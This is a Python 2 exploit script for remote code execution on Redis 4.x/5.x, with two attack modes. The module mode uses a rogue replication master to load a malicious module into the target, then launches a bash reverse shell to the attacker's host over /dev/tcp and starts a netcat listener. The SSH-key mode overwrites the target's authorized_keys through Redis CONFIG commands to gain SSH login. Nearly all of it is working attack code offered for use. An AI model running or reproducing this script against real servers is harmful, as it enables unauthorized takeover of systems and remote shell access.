#!/usr/bin/env python2
# -*- coding: utf-8 -*- #####################################################################################
# ██▀███  ▓█████ ▓█████▄  ██▓  ██████  ██▀███   ▄████▄  ▓█████                                              #
# ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██▒▒██    ▒ ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀                                             #
# ▓██ ░▄█ ▒▒███   ░██   █▌▒██▒░ ▓██▄   ▓██ ░▄█ ▒▒▓█    ▄ ▒███                                               #
# ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░██░  ▒   ██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄                                             #
# ░██▓ ▒██▒░▒████▒░▒████▓ ░██░▒██████▒▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒                                            #
# ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░                                            #
# ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░                                              #
# ░░   ░    ░    ░ ░  ░  ▒ ░░  ░  ░    ░░   ░ ░           ░                                                 #
# ░        ░  ░   ░     ░        ░     ░     ░ ░         ░  ░                                               #
# ░                            ░                                                                            #
# redis_rce .py - nighter@nighter.se                                                              #
#                                                                                                           #
# DATE                                                                                                      #
# 22/01/2020                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# exploit for Redis 4.x/5.x RCE (Multiple vectors)                                                          #
#                                                                                                           #
# Just improved version of: https://github.com/Ridter/redis-rce/blob/master/redis-rce.py                    #
# And with some more Redis attacks consolidated.                                                            #
#                                                                                                           #
# nighter@nighter.se                                                                              #
#                                                                                                           #
#############################################################################################################

import base64
import os

import socket
import sys
from time import sleep
from os.path import expanduser

from multiprocessing import Process

""" For simplicity we store module as base64 payload """
MODULE_PAYLOAD = ''''''
""" Settings """
CLRF = "\r\n"
SLAVE_PORT = 9000

###########################################
### Copied and pasted rouge server code
###########################################

def encode_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd


def encode_cmd(raw_cmd):
    return encode_cmd_arr(raw_cmd.split(" "))


def decode_cmd(cmd):
    if cmd.startswith("*"):
        raw_arr = cmd.strip().split("\r\n")
        return raw_arr[2::2]
    if cmd.startswith("$"):
        return cmd.split("\r\n", 2)[1]
    return cmd.strip().split(" ")


def info(msg):
    print(msg)


def error(msg):
    print(msg)


def din(sock, cnt=4096):
    global verbose
    msg = sock.recv(cnt)
    return msg.decode()


def dout(sock, msg):
    global verbose
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)


def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])


class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, int(self._port)))

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(encode_cmd(cmd))
        buf = self.recv()
        return buf

    def shell_cmd(self, cmd):
        self.send(encode_cmd_arr(['system.exec', cmd]))
        buf = self.recv()
        return buf


class RogueServer:

    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind(('0.0.0.0', int(self._port)))
        self._sock.listen(10)
        self.payload = open('/tmp/exec.so', "rb").read()

    def close(self):
        self._sock.close()

    def handle(self, data):
        cmd_arr = decode_cmd(data)
        resp = ""
        phase = 0
        if cmd_arr[0].startswith("PING"):
            resp = "+PONG" + CLRF
            phase = 1
        elif cmd_arr[0].startswith("REPLCONF"):
            resp = "+OK" + CLRF
            phase = 2
        elif cmd_arr[0].startswith("PSYNC") or cmd_arr[0].startswith("SYNC"):
            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
            resp += "$" + str(len(self.payload)) + CLRF
            resp = resp.encode()
            resp += self.payload + CLRF.encode()
            phase = 3
        return resp, phase

    def exp(self):
        cli, addr = self._sock.accept()
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 3:
                break


def cleanup(remote):
    print("[+] Unload module...")
    remote.do("MODULE UNLOAD system")


def runserver(HOST, PORT, LHOST, LPORT):

    remote = Remote(HOST, PORT)

    print("[+] Setting master")
    remote.do("SLAVEOF %s %s" % (LHOST, SLAVE_PORT))

    print("[+] Setting Path")
    remote.do("CONFIG SET dir /tmp")

    print("[+] Setting dbfilename")
    remote.do("CONFIG SET dbfilename exec.so")
    sleep(2)

    rogue = RogueServer(LHOST, SLAVE_PORT)
    rogue.exp()
    rogue.close()
    sleep(2)
    print("[+] Loading module")
    remote.do("MODULE LOAD /tmp/exec.so")

    print("[+] Cleanup")
    remote.do("SLAVEOF NO ONE")
    remote.do("CONFIG SET dbfilename dump.rdb")
    remote.shell_cmd("rm /tmp/exec.so")

    print("[+] Exploit")
    reverse_cmd = '''/bin/bash -c "/bin/bash -i >& /dev/tcp/%s/%s 0>&1"''' % (LHOST, LPORT)
    remote.shell_cmd(reverse_cmd)
    cleanup(remote)


def module_attack():

    print("[+] Module attack")

    decoded = base64.b64decode(MODULE_PAYLOAD)
    with file('/tmp/exec.so', 'w') as payload_file:
        payload_file.write(decoded)

    runserver(HOST, PORT, LHOST, LPORT)

def ssh_key_attack():

    ''' My plan was to remove dependency on this cli tool but got lazy.'''
    if os.path.isfile('/usr/bin/redis-cli') is False:
        print('[-] redis-cli tool is required for this attack.')
        sys.exit(1)

    print('[+] Generating SSH keys')
    os.system('ssh-keygen -t rsa -C \"redis_user\"')
    os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
    cmd = "cat $HOME/.ssh/public_key.txt | redis-cli -h %s -p %s -x set cracklist" % (HOST, PORT)
    os.system(cmd)
    cmd = 'redis-cli -h %s -p %s config set dbfilename "backup.db"' % (HOST, PORT)
    os.system(cmd)

    if USERNAME == 'redis':
        cmd = "redis-cli -h %s -p %s config set dir /var/lib/redis/.ssh/" % (HOST, PORT)
    else:
        cmd = "redis-cli -h %s -p %s config set dir /home/%s/.ssh/" % (HOST, PORT, USERNAME)

    os.system(cmd)

    cmd = "redis-cli -h %s -p %s config set dbfilename \"authorized_keys\"" % (HOST, PORT)
    os.system(cmd)

    cmd = "redis-cli -h %s -p %s save" % (HOST, PORT)
    os.system(cmd)

    cmd = "ssh -i $HOME/.ssh/id_rsa %s@%s" % (HOST, PORT)
    os.system(cmd)


def __usage():

    print ("""
     ██▀███  ▓█████ ▓█████▄  ██▓  ██████  ██▀███   ▄████▄  ▓█████ 
    ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██▒▒██    ▒ ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
    ▓██ ░▄█ ▒▒███   ░██   █▌▒██▒░ ▓██▄   ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
    ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░██░  ▒   ██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
    ░██▓ ▒██▒░▒████▒░▒████▓ ░██░▒██████▒▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
    ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
      ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░
      ░░   ░    ░    ░ ░  ░  ▒ ░░  ░  ░    ░░   ░ ░           ░   
       ░        ░  ░   ░     ░        ░     ░     ░ ░         ░  ░
                     ░                            ░               
    [nighter@nighter.se]
        """)
    print("Usage: %s <TYPE> <RHOST:[RPORT]> <LHOST> <LPORT> [PASSWORD]" % (sys.argv[0]))
    print("EXAMPLE: ./redis_rce.py module '10.10.10.70:6379' 10.10.14.24 1337")
    print("EXAMPLE: ./redis_rce.py sshkey '10.10.10.70:6739 redis [password]")

    sys.exit(0)


if __name__ == '__main__':

    if len(sys.argv) < 4:
        __usage()

    TYPE = sys.argv[1]
    RHOST = sys.argv[2]

    if ':' in RHOST:
        HOST = RHOST.split(':')[0]
        PORT = RHOST.split(':')[1]
    else:
        HOST = RHOST
        PORT = '6379'

    if TYPE == 'sshkey':
        USERNAME = sys.argv[3]
        ssh_key_attack()
        sys.exit(0)

    LHOST = sys.argv[3]
    try:
        LPORT = sys.argv[4]
    except:
        print('[-] LPORT not specified')
        sys.exit(0)

    print("[+] LHOST = %s" % LHOST)
    print("[+] LPORT = %s" % LPORT)

    try:
        PASSWORD = sys.argv[5]
        pass
    except:
        PASSWORD = ''

    if TYPE.lower() == 'module':

        p = Process(target=module_attack)
        p.start()

        os.system('nc -lnvp %s' % LPORT)

    else:
        print("[-] No such attack\n")
        __usage()


